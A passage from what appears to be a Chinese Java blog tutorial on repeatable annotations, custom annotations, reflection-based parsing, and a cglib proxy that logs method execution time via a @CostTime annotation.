解除了这一限制，开发者可以根据各自系统中的实际需求在所有可以使用注解的地方使用可重复注解。</p><p>由于兼容性的缘故，可重复注解并不是所有新定义的注解的默认特性，需要开发者根据自己的需求决定新定义的注解是否可以重复注解。Java 编译器会自动把可重复注解储存到指定的注解容器中。而为了触发编译器进行这一操作，开发者需要进行以下的定义：</p><p>首先，在需要重复标注特性的注解前加上<code>@Repeatable</code>标签，示例如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Repeatable</span><span class="token punctuation">(</span><span class="token class-name">AccessContainer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Access</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">role</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>@Repeatable</code>标签后括号中的值即为指定的注解容器的类型。在这个例子中，注解容器的类型是<code>AccessContainer</code>，Java 编译器会把重复的 Access 对象保存在 AccessContainer 中。</p><p>AccessContainer 中必须定义返回数组类型的 value 方法。数组中元素的类型必须为对应的可重复注解类型。具体示例如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">AccessContainer</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Access</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以通过 Java 的反射机制获取注解的 Annotation。一种方式是通过 AnnotatedElement 接口的<code>getAnnotationByType(Class&lt;T&gt;)</code>。首先获得 Container Annotation，然后再通过 Container Annotation 的 value 方法获得可重复注解。另一种方式是用过 AnnotatedElement 接口的<code>getAnnotations(Class&lt;T&gt;)</code>方法一次性返回可重复注解。</p><p>可重复注解使得开发者可以根据具体的需求对同一个声明式或者类型加上同一类型的注解，从而增加代码的灵活性和可读性。</p><h2 id="自定义注解及解析"><a href="#自定义注解及解析" class="headerlink" title="自定义注解及解析"></a>自定义注解及解析</h2><h3 id="1-自定义注解"><a href="#1-自定义注解" class="headerlink" title="1. 自定义注解"></a>1. 自定义注解</h3><p>创建Java的自定义注解和创建一个接口相似，但是注解的<code>interface</code>关键字需要以<code>@</code>符号开头。我们可以为注解声明方法。我们先来看看一个自定义注解的示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Documented</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ElementType</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Inherited</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Inherited</span><span class="token annotation punctuation">@Documented</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">MethodInfo</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">author</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> 'blinkfox'<span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">revision</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token function">comments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自定义注解就需要用到上面所介绍到的几种元注解，可以看出元注解就是用来注解其它注解。自定义注解和接口类似，只能定义<strong>方法</strong>，注解中的<strong>方法</strong>需要遵循以下几种规则：</p><ul><li>注解方法不能带有参数；</li><li>注解方法返回值类型限定为：基本类型、String、Enums、Annotation或者是这些类型的数组；</li><li>注解方法可以有默认值。</li></ul><h3 id="2-注解的解析"><a href="#2-注解的解析" class="headerlink" title="2. 注解的解析"></a>2. 注解的解析</h3><p>要解析Java中的注解需要使用Java反射技术。那么注解的<code>RetentionPolicy</code>应该设置为<code>RUNTIME</code>，否则Java类的注解信息在执行过程中将不可用，我们也就不能从中得到任何和注解有关的数据。以下是解析注解常用的几种方法的示例代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Annotation</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AnnotationParsing</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> log <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">AnnotationParsing</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method <span class="token operator">:</span> <span class="token class-name">AnnotationParsing</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>journaldev<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span>AnnotationExample</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// checks if MethodInfo annotation is present for the method</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>journaldev<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span>MethodInfo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// iterates all the annotations available in the method</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Annotation</span> anno <span class="token operator">:</span> method<span class="token punctuation">.</span><span class="token function">getDeclaredAnnotations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>'<span class="token class-name">Annotation</span> in <span class="token class-name">Method</span> ''<span class="token operator">+</span> method <span class="token operator">+</span> '<span class="token char">' : '</span> <span class="token operator">+</span> anno<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token class-name">MethodInfo</span> methodAnno <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">MethodInfo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>methodAnno<span class="token punctuation">.</span><span class="token function">revision</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>'<span class="token class-name">Method</span> <span class="token keyword">with</span> <span class="token namespace">revision</span> no <span class="token number">1</span> <span class="token operator">=</span> '<span class="token operator">+</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"解析Java注解出错!"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注解的应用之监控方法执行耗时"><a href="#注解的应用之监控方法执行耗时" class="headerlink" title="注解的应用之监控方法执行耗时"></a>注解的应用之监控方法执行耗时</h2><p>通过前面对元注解的介绍，我们就可以自定义我们需要的注解了。假如，我们需要监控某些方法的执行，最原始的办法就是在方法执行的开头和结尾分别记录时间，最后计算前后的时间差即可，但是这些代码与核心业务无关，且大量重复、分散在各处，维护起来也困难。这时我们可以<a href="http://blinkfox.com/shi-yong-spring-aoplai-tong-ji-fang-fa-de-zhi-xing-shi-jian/">使用Spring AOP来统计方法的执行耗时</a>，同时我们也可以使用注解的方式来实现，更自由灵活。</p><p>首先，定义我们的执行耗时的方法上的注解：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Documented</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ElementType</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token comment">/** * 自定义'统计方法耗时'并打印日志的注解. * * @author blinkfox on 2017-01-04. */</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Documented</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">CostTime</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 执行超过某毫秒数时数则打印'warn'级别的日志，默认 0ms，即默认都打印.     *     * @return 毫秒数     */</span>    <span class="token keyword">long</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后，书写监控所标注有<code>@CostTime</code>注解的方法代理类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">net<span class="token punctuation">.</span>sf<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>proxy<span class="token punctuation">.</span></span><span class="token class-name">Enhancer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">net<span class="token punctuation">.</span>sf<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>proxy<span class="token punctuation">.</span></span><span class="token class-name">MethodInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">net<span class="token punctuation">.</span>sf<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>proxy<span class="token punctuation">.</span></span><span class="token class-name">MethodProxy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span></span><span class="token punctuation">;</span><span class="token comment">/** * 被标注为'@CostTime'注解的方法执行耗时的代理方法. * &lt;p>实现了cglib中的`MethodInterceptor`的方法拦截接口.&lt;/p> * * @author blinkfox on 2017-01-04. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CostTimeProxy</span> <span class="token keyword">implements</span> <span class="token class-name">MethodInterceptor</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> log <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">CostTimeProxy</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Enhancer</span> enhancer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Enhancer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 获取代理类.     *     * @param cls 代理类的class     * @return 代理类实例     */</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getProxy</span><span class="token punctuation">(</span><span class="token class-name">Class</span> cls<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        enhancer<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">;</span>        enhancer<span class="token punctuation">.</span><span class="token function">setCallback</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> enhancer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 拦截方法,判断是否有'@CostTime'的注解，如果有则拦截执行.     *     * @param o 对象     * @param method 方法     * @param args 参数     * @param methodProxy 代理方法     * @return 对象     * @throws Throwable 问题     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">intercept</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">,</span> <span class="token class-name">MethodProxy</span> methodProxy<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 判断该方法上是否有 CostTime 注解</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>method<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span><span class="token class-name">CostTime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> methodProxy<span class="token punctuation">.</span><span class="token function">invokeSuper</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 获取注解信息</span>        <span class="token class-name">CostTime</span> costTime <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">CostTime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> limitTime <span class="token operator">=</span> costTime<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 记录方法执行前后的耗时时间，并做差，判断是否需要打印方法执行耗时</span>        <span class="token keyword">long</span> startTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> result <span class="token operator">=</span> methodProxy<span class="token punctuation">.</span><span class="token function">invokeSuper</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> diffTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> startTime<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>limitTime <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>diffTime <span class="token operator">>=</span> limitTime<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> methodName <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 打印耗时的信息</span>            log<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">"【CostTime监控】通过注解监控方法'&#123;&#125;'的执行耗时为:&#123;&#125;"</span><span class="token punctuation">,</span> methodName<span class="token punctuation">,</span> diffTime<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着，可以写一些业务类及方法，这里就以<code>A</code>类为例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span></span><span class="token punctuation">;</span><span class="token comment">/** * A类. * * @author blinkfox on 2017/1/1. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> log <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 始终打印方法执行耗时的方法.     */</span>    <span class="token annotation punctuation">@CostTime</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doSomeThing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"执行A类中doSomeThing()方法！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 当方法执行耗时大于等于'50ms'时打印出方法执行耗时.     */</span>    <span class="token annotation punctuation">@CostTime</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doSomeThing2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"执行A类中doSomeThing2()方法！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后，是用来测试<code>A</code>类某些业务方法执行耗时的测试类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>test<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token comment">/** * 耗时注解使用测试示例 * Created by blinkfox on 2017-01-04. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CostTimeTest</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/** A类的全局实例. */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">A</span> a<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">CostTimeProxy</span> aproxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CostTimeProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">)</span> aproxy<span class="token punctuation">.</span><span class="token function">getProxy</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * main 方法.     *     * @param args 数组参数     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        a<span class="token punctuation">.</span><span class="token function">doSomeThing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">doSomeThing2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就完成了对A类被标注了<code>@CostTime</code>注解的方法执行耗时的监控。当然你可以配置需要扫描的包(<code>package</code>)下的所有类中被标注为<code>@CostTime</code>注解的方法的执行耗时，这里就不介绍了。</p><hr><p>参考文档：</p><ul><li><a href="http://www.importnew.com/17413.html">Java注解教程及自定义注解</a></li><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-java8annotation/">Java 8 Annotation 新特性在软件质量和开发效率方面的提升</a></li><li><a href="http://blog.csdn.net/u014207606/article/details/52291951">Java内置系统注解和元注解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射基础</title>
      <link href="/2018/11/07/hou-duan/java-fan-she-ji-chu/"/>
      <url>/2018/11/07/hou-duan/java-fan-she-ji-chu/</url>
      
